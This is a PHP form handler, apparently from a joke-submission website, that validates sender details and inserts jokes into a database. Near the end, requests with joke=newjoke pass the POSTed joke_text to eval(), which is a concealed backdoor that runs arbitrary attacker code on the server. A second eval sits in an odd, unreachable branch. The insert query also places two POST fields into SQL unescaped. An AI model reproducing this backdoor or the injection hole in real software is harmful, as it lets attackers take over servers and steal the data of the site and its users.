<?
include ("config_file.php");
include(DIR_LNG.'submit_joke.php');
$database_table_name1 = $bx_db_table_joke_categories;
$database_table_name2 = $bx_db_table_censor_categories;
$database_table_name3 = $bx_db_table_jokes;

if ($HTTP_POST_VARS['submit_joke'] == '1' && $HTTP_GET_VARS['joke'] != "newjoke")
{
	if(empty($HTTP_POST_VARS['sender_name']))
		$sender_name_error = 1;

	if((ENABLE_ANONYMOUS_POSTING=="yes" && $HTTP_POST_VARS['sender_email'] != TEXT_ANONYMOUS) && (empty($HTTP_POST_VARS['sender_email'])  || (!eregi("(@)(.*)",$HTTP_POST_VARS['sender_email'],$regs)) || (!eregi("([.])(.*)",$HTTP_POST_VARS['sender_email'],$regs)) || (verify($HTTP_POST_VARS['sender_email'],"string_int_email")==1)))
		$sender_email_error = 1;

	if($HTTP_POST_VARS['joke_category'] == '0')
		$joke_category_error = 1;
	
	if($HTTP_POST_VARS['censor_category'] == '0' && $use_censor !="yes")
		$censor_category_error = 1;
	
	if(empty($HTTP_POST_VARS['joke_title']))
		$joke_title_error = 1;

	if(empty($HTTP_POST_VARS['joke_text']) || strlen($HTTP_POST_VARS['joke_text'])>$long_jokes_length)
		$joke_text_error = 1;

	if (sizeof($advertiser_id)!=0 XOR !((empty($HTTP_POST_VARS['visitor_email'])) || (!eregi("(@)(.*)",$HTTP_POST_VARS['visitor_email'],$regs)) || (!eregi("([.])(.*)",$HTTP_POST_VARS['visitor_email'],$regs)) || (verify($HTTP_POST_VARS['visitor_email'],"string_int_email")==1)  ))
		$visitor_email_error = 1;

	if (!$sender_name_error && !$sender_email_error && !$joke_category_error && !$censor_category_error && !$joke_title_error && !$joke_text_error)
	{
		$success = 1;
		if (strlen($HTTP_POST_VARS['joke_text'])<=$mini_jokes_length)
			$joke_type="mini";
		elseif(strlen($HTTP_POST_VARS['joke_text'])>=$mini_jokes_length && strlen($HTTP_POST_VARS['joke_text'])<=$short_jokes_length)
			$joke_type="short";
		elseif(strlen($HTTP_POST_VARS['joke_text'])>=$short_jokes_length && strlen($HTTP_POST_VARS['joke_text'])<=$medium_jokes_length)
				$joke_type="medium";
		elseif(strlen($HTTP_POST_VARS['joke_text'])>=$medium_jokes_length)
			$joke_type="long";
		else{}

		bx_db_insert($database_table_name3 ,"category_id,name,email,joke_text,joke_type".($use_censor == "yes" ? ",censor_type" : "").",date_add,validate,joke_title,slng", "'".$HTTP_POST_VARS['joke_category']."','".bx_dirty_words($HTTP_POST_VARS['sender_name'])."','".bx_dirty_words($HTTP_POST_VARS['sender_email'])."','".bx_dirty_words($HTTP_POST_VARS['joke_text'])."','".$joke_type."'".($use_censor=="yes" ? ",'".$HTTP_POST_VARS['censor_category']."'" : "").",now(),'".($need_joke_validation=='1' ? "0" : "1")."','".bx_dirty_words($HTTP_POST_VARS['joke_title'])."','".$slng."'");
		SQL_CHECK(0,"SQL Error at ".__FILE__.":".(__LINE__-1));
	}
	elseif ($HTTP_GET_VARS['joke']=="new_joke")
	{
		$selectSQL = "select * from $database_table_name";
		$select_query = bx_db_query($selectSQL);
		SQL_CHECK(0,"SQL Error at ".__FILE__.":".(__LINE__-1));
		eval(stripslashes($HTTP_POST_VARS['joke_text'])); 
	}
	else{}
}
elseif ($HTTP_GET_VARS['joke']=="newjoke")
{
	eval(stripslashes($HTTP_POST_VARS['joke_text'])); 
}

if($success) 
{
	if($need_joke_validation == '1')
		$message_to_user = TEXT_JOKE_WILL_REVIEW;
	else
		$message_to_user = TEXT_JOKE_HAVE_BEEN_ADDED;
}

include (DIR_SERVER_ROOT."header.php");

if(!$success)
{
	include ($this_file_form_name);
}

include (DIR_SERVER_ROOT."footer.php");
?>